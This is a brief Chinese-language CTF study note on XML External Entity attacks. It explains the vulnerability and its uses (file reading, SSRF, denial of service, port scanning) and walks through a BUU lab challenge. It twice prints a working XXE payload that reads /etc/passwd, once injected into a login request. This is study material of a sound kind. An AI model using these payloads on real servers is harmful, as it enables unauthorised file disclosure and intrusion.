# XXE Attack

## Introduction from LLM

### XXE（XML External Entity）简介

XXE是一种攻击，它发生在应用程序解析XML输入时，没有正确地限制外部实体的引用。攻击者可以利用XXE执行以下操作：

- 访问服务器上的文件系统。
- 执行远程服务的请求。
- 导致拒绝服务攻击（例如，通过大量加载外部实体）。
- 探测内部网络（如果服务器可以访问内部网络）。

### XXE攻击的原理

XML是一种用于存储和传输数据的标记语言。在XML中，可以通过DTD（Document Type Definition）定义外部实体。外部实体允许XML文档包含来自外部源的数据。XXE漏洞发生在应用程序解析XML输入时，错误地处理了这些外部实体的引用。

以下是一个简单的XXE攻击示例：

```xml-dtd
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

在这个例子中，攻击者定义了一个名为`xxe`的外部实体，它将尝试读取服务器的`/etc/passwd`文件。当应用程序解析这个XML文档时，它将包含`/etc/passwd`文件的内容，并将其发送回攻击者。

### XXE在CTF中的利用

在CTF竞赛中，XXE漏洞通常用于以下目的：

1. **文件读取**：攻击者可能会尝试读取服务器上的敏感文件，例如配置文件、源代码或秘密密钥。
2. **服务器端请求伪造（SSRF）**：XXE可以用来对服务器可以访问的内部或外部服务发起请求。
3. **拒绝服务攻击**：通过包含大量数据的外部实体，攻击者可以使服务器资源耗尽。
4. **端口扫描**：攻击者可以使用XXE来探测服务器可访问的内部网络。



### Basic Challenge

`BUU XXE COURSE 1`

POST DATA:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <username>1</username>
    <password>2</password>
</root>
```

XML形式插入，可能存在XXE，用示例代码尝试：

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
    <username>&xxe;</username>
    <password>2</password>
</root>
```

成功